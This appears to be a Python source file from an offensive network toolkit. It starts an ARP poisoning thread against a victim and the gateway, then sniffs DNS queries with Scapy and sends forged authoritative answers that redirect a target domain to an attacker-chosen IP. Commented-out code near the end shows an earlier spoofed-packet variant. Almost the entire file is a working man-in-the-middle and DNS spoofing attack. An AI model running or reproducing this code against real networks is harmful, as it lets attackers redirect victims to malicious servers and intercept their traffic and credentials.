from arp_poison import run as arp_poison_run
from scapy.all import *
import threading
import time
from utils import get_gateway_ip, network_utils
# First: we need to poison the gateway router and the victim's ARP table for the gateway router.
# Then we need to send a DNS request for the to-be-spoofed domain, to analyze the response.
# We then spoof the reponse so it reroutes the domain the the spoof ip, and spam this spoofed response to the victim.

def run(args):
    domain = args.domain
    spoof_ip = args.spoof_ip
    interface = args.interface
    victim_ip = args.victim_ip

    # Spoof the gateway router
    gateway_ip = get_gateway_ip.find_gateway_ip()
    args.gateway_ip = gateway_ip
    args.gateway_mac = network_utils.get_mac_address(gateway_ip, interface=args.interface)
    stop_event = threading.Event()

    def dns_spoof_packet(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            # Packet is a DNS request
            dns_req = packet.getlayer(DNS).qd.qname
            
            if domain in dns_req:
                print( "Intercepted DNS request for {}".format(dns_req))

                # Build the spoofed DNS response
                dns_response = (
                    Ether(src=packet[Ether].dst, dst=packet[Ether].src) /
                    IP(src=packet[IP].dst, dst=packet[IP].src) /
                    UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1,  # This is a response
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoof_ip)
                    )
                )

                # Send the spoofed response
                sendp(dns_response, iface=interface)  # Adjust the interface as needed
                print("Sent spoofed DNS response for {} to {}".format(dns_req, spoof_ip))

    try:
        arp_poison_thread = threading.Thread(target=arp_poison_run, args=(args, stop_event))
        arp_poison_thread.setDaemon(True)
        arp_poison_thread.start()

        #packet = request_dns(domain, interface)     
        #print("Response {}".format(packet.summary()))
        #print(packet[DNS].an)
        #spoofed_packet = spoof_packet(packet, spoof_ip, victim_ip)
        #print("Spoofed response {}".format(spoofed_packet.summary()))
        sniff(filter="udp port 53", prn=dns_spoof_packet, iface=interface)
        print("Stopping sniffing... (Ctrl+C again to stop the ARP Poisoning too.)")

        while not stop_event.is_set():
            time.sleep(0.5)
            print("Schleep")
    except (KeyboardInterrupt, SystemExit):
        stop_event.set()
        arp_poison_thread.join()
    
    

# Get the response to a DNS request for a specific domain
def request_dns(domain, interface):
    # Send a DNS request for the domain
    dns_request = (IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=domain)))
    return sr1(dns_request, verbose=0, iface=interface)

# Spoof a DNS response to reroute the domain to a spoofed IP
#def spoof_packet(packet, spoof_ip, victim_ip):
    # Spoof the response
    #spoofed_packet = packet.copy()
    #spoofed_packet[DNS].an[0].rdata = spoof_ip
    #del spoofed_packet[IP].chksum
    #del spoofed_packet[UDP].chksum
    #spoofed_packet[IP].dst = victim_ip
    #spoofed_packet[IP].src = "62.179.104.196"
    
#    spoofed_packet = (IP(src="62.179.104.196", dst=victim_ip) /
#                     UDP(sport=packet[UDP].sport, dport=55660) /
#                     DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoof_ip)))
#    return spoofed_packet